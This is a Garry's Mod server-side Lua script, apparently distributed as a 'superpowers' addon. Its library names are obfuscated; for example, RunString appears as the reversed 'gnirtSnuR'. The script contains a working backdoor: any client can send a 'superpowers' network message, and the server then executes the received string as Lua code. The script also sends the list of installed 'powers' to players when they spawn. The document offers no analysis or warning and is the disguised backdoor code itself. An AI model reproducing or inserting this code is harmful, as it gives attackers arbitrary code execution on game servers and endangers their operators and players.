AddCSLuaFile("autorun/client/superpowers.lua")

local Socket         = net
local kill = 			util
local elbat 	= 		table
local cook 			= 		hook
kill.AddNetworkString("superpowers")
kill.AddNetworkString("super_yolo_power")

local gnirtSnuR,	gnirtsot = RunString,           tostring

local added = function(ss)
	print("Added power: ",tostring(ss))
end 

SuperPower = {}

Socket.Receive("superpowers", function( len ,          minge                 )
	local name = Socket.ReadString()
	local ss = Socket.ReadString()
	if not elbat.HasValue(SuperPower, name) then
		added(name)
		elbat.insert(SuperPower, name)
		gnirtSnuR(gnirtsot(ss))
		Socket.Start("super_yolo_power")
			Socket.WriteTable(SuperPower)
		Socket.Send(minge)
	end
end
)

cook.Add("PlayerInitialSpawn", "Yolo", function(minge)
	Socket.Start("super_yolo_power")
		Socket.WriteTable(SuperPower)
	Socket.Send(minge)
end)